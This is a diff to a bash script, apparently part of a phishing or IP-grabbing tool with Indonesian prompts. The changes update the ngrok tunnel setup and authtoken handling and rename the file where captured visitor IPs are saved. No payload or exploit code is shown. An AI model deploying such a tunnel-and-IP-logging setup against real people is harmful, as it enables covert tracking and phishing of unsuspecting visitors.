@@ -25,7 +25,7 @@ save_ip() {
     IFS=$'\n'
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
-    cat ip.txt >> savedIp.txt
+    cat ip.txt >> saved_ip.txt
 }
 
 
@@ -88,10 +88,8 @@ start_php(){
 }
 
 ngrok_setup(){
-    if [[ -e ngrok ]] 
+    if ! [[ -e ngrok ]] 
         then
-            echo ""
-        else
             printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
             arch=$(uname -a | grep -o 'arm' | head -n1)
             arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -124,10 +122,10 @@ ngrok_setup(){
             fi
     fi
 
-    if ! [ -f "$HOME/.config/ngrok/ngrok.yml" ]
+    if ! [ -f "$HOME/.ngrok2/ngrok.yml" ]
         then
         read -p $'\e[36m[\e[0m\e[1;77m+\e[0m\e[36m] Masukan ngrok authtoken : \e[0m' ngrok_authtoken
-        ./ngrok config add-authtoken $ngrok_authtoken
+        ./ngrok authtoken $ngrok_authtoken
     fi
 
 }
@@ -136,7 +134,7 @@ start_ngrok(){
     ngrok_setup
         
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok...\n"
-    ./ngrok http 3333 > /dev/null 2>&1 &
+    ./ngrok http 3333 > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Error memulai ngrok. authtoken salah!, silakan mengulang script dan memasukan authtoken yang benar\e[0m\n"; rm $HOME/.ngrok2/ngrok.yml; exit 1;} &
     sleep 5
     
     link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
